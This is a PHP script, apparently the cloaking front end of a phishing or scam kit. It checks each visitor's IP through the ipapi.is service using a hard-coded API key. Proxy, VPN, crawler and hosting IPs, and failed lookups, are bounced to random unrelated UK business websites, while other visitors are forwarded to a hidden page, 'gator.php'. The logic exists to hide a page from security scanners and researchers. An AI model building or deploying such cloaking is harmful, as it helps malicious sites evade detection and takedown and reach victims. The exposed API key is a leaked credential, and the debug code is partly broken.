<?php

// Turn on output buffering to prevent errors with the header() function.
ob_start();

//$visitorip = $_SERVER['REMOTE_ADDR'];
$visitorip = '105.76.161.244';
echo $visitorip;

// 1. Define the API URL and Key for ipapi.is
$apiKey = 'f229a9769964cf836381';
$ipAddress = '82.102.23.116'; // Get the real visitor IP 105.76.161.244
//$apiUrl = "https://api.ipapi.is/?q=105.76.161.244&key={$apiKey}";
$apiUrl = "https://api.ipapi.is/?q=105.76.161.244&key={$apiKey}";

// 2. Initialize a cURL session
$curl = curl_init();

// 3. Set cURL options
curl_setopt($curl, CURLOPT_URL, $apiUrl);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_TIMEOUT, 10);
// It's good practice to set a User-Agent
curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0');

// 4. Execute the cURL request
$response = curl_exec($curl);
$httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
$curlError = curl_error($curl);

// 5. Close the cURL session
curl_close($curl);

// 6. Check for cURL errors or non-successful HTTP codes.
if ($curlError || $httpCode != 200) {
	echo 'curl error :'.$curlError;

	// 4. Execute the cURL request
	$response = curl_exec($curl);
	$httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	$curlError = curl_error($curl);

	// 5. Close the cURL session
	curl_close($curl);
		
}

// 7. Decode the JSON response
$data = json_decode($response, true);
//echo $response;

// 8. === MAIN LOGIC: CHECK AND REDIRECT BASED ON YOUR RULES ===
// Check if the API response is valid and does not contain an error.
if ($data && !isset($data['error'])) {
    echo 'data exist no error ';
    // --- Define the conditions that will trigger a redirect ---
    $isProxy = !empty($data['is_proxy']);
    $isCrawler = !empty($data['is_crawler']);
    $isVpn = !empty($data['is_vpn']);
    $isCompanyHosting = isset($data['company']['type']) && $data['company']['type'] === 'hosting';
    $isAsnHosting = isset($data['asn']['type']) && $data['asn']['type'] === 'hosting';
	
	//echo 'helloo';
    
    // Check if ANY ONE of the conditions is true
    if ($isProxy || $isCrawler || $isVpn || $isCompanyHosting || $isAsnHosting) {
        echo 'detected bot ';
        // --- This is a high-risk IP, redirect to a random domain ---
        $domain_list = [
            'https://www.123homeopathy.co.uk',
            'https://www.3dsecurity.org.uk',
            'https://www.3riversshamanicgroup.co.uk',
            'https://www.5ashes.co.uk',
            'https://www.999pc.co.uk',
			'https://www.deondesign.co.uk',
			'https://www.activetreecareltd.co.uk',
			'https://www.alanphillips.co.uk',
			'https://www.alanwareham.co.uk',						
        ];
        
        $chosen_domain = $domain_list[array_rand($domain_list)];
        
        header('Location: ' . $chosen_domain);
        exit;

    } else {
		echo 'normal user ';
        // --- This is a clean, regular user IP ---
        // Redirect to the normal gator.php page.
        header('Location: gator.php');
        exit;
    }

} else {
	echo 'data dont exist';
    // If the API response is malformed or contains an error,
    // send the user to the default page as a safe fallback.
        $domain_list = [
            'https://www.123homeopathy.co.uk',
            'https://www.3dsecurity.org.uk',
            'https://www.3riversshamanicgroup.co.uk',
            'https://www.5ashes.co.uk',
            'https://www.999pc.co.uk',
			'https://www.deondesign.co.uk',
			'https://www.activetreecareltd.co.uk',
			'https://www.alanphillips.co.uk',
			'https://www.alanwareham.co.uk',						
        ];
        
        $chosen_domain = $domain_list[array_rand($domain_list)];
        
        header('Location: ' . $chosen_domain);
        exit;
}

// Flush any accidental output
ob_end_flush();

?>